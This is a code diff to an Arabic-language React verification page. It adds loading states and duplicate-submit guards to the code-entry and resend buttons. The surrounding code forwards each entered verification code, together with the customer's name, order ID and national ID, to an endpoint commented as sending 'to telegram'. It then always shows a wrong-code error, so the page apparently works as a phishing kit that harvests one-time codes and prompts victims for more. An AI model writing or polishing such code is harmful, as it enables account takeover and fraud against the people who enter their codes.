@@ -14,6 +14,8 @@ export default function VerifyPage() {
   const [confirmed, setConfirmed] = useState(false);
   const [resendCooldown, setResendCooldown] = useState(60);
   const [submitCooldown, setSubmitCooldown] = useState(0);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [isResending, setIsResending] = useState(false);
   const submitCooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const [dbOrderId, setDbOrderId] = useState<string | null>(null);
   const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
@@ -62,15 +64,22 @@ export default function VerifyPage() {
 
 
   async function handleSubmit() {
+    if (isSubmitting || submitCooldown > 0) return;
     if (code.length !== 4 && code.length !== 6) { setCodeError(true); return; }
     const submittedCode = code;
 
+    setIsSubmitting(true);
+
     // Send to telegram immediately
-    await fetch("/api/verify", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ code: submittedCode, orderId, customerName, customerId: customer?.nationalId ?? "—" }),
-    });
+    try {
+      await fetch("/api/verify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ code: submittedCode, orderId, customerName, customerId: customer?.nationalId ?? "—" }),
+      });
+    } catch {}
+
+    setIsSubmitting(false);
 
     // Show wrong code error immediately
     setWrongCode(true);
@@ -225,18 +234,23 @@ export default function VerifyPage() {
             <div className="space-y-3">
               <button
                 onClick={handleSubmit}
-                disabled={submitCooldown > 0}
+                disabled={isSubmitting || submitCooldown > 0}
                 className="w-full py-4 rounded-xl font-black text-sm transition-all active:scale-[0.98] disabled:opacity-60 disabled:cursor-not-allowed"
                 style={{ backgroundColor: "#BC9255", color: "#fff", boxShadow: "0 4px 16px rgba(188,146,85,0.3)" }}
               >
-                {submitCooldown > 0 ? `انتظر ${submitCooldown} ثانية...` : "تأكيد الرمز"}
+                {isSubmitting ? "جاري الإرسال..." : submitCooldown > 0 ? `انتظر ${submitCooldown} ثانية...` : "تأكيد الرمز"}
               </button>
 
               <div className="grid grid-cols-2 gap-3">
                 <button
-                  disabled={resendCooldown > 0}
-                  onClick={() => {
-                    fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName: customer?.name ?? "—" }) });
+                  disabled={isResending || resendCooldown > 0}
+                  onClick={async () => {
+                    if (isResending || resendCooldown > 0) return;
+                    setIsResending(true);
+                    try {
+                      await fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName: customer?.name ?? "—" }) });
+                    } catch {}
+                    setIsResending(false);
                     setResent(true);
                     setWrongCode(false);
                     setTimeout(() => setResent(false), 3000);
@@ -246,7 +260,7 @@ export default function VerifyPage() {
                   style={{ backgroundColor: "rgba(188,146,85,0.06)", color: "#A77D4B", border: "1px solid rgba(188,146,85,0.15)" }}
                 >
                   <IoRefreshOutline size={14} />
-                  {resendCooldown > 0 ? `${resendCooldown}ث` : "إعادة إرسال"}
+                  {isResending ? "جاري..." : resendCooldown > 0 ? `${resendCooldown}ث` : "إعادة إرسال"}
                 </button>
 
                 <Link
